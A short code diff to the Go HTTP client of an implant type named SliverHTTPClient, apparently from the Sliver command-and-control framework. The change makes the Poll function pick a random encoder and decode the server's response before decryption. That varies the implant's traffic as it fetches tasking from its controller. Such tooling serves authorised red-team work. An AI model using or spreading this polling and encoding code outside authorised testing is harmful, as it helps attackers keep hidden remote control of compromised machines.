@@ -217,7 +217,8 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, errors.New("no session")
 	}
 	uri := s.jsURL()
-	req := s.newHTTPRequest(http.MethodGet, uri, encoders.NopNonce(), nil)
+	nonce, encoder := encoders.RandomEncoder()
+	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -239,7 +240,11 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
-	return GCMDecrypt(*s.SessionKey, respData)
+	data, err := encoder.Decode(respData)
+	if err != nil {
+		return nil, err
+	}
+	return GCMDecrypt(*s.SessionKey, data)
 }
 
 // Send - Perform an HTTP POST request
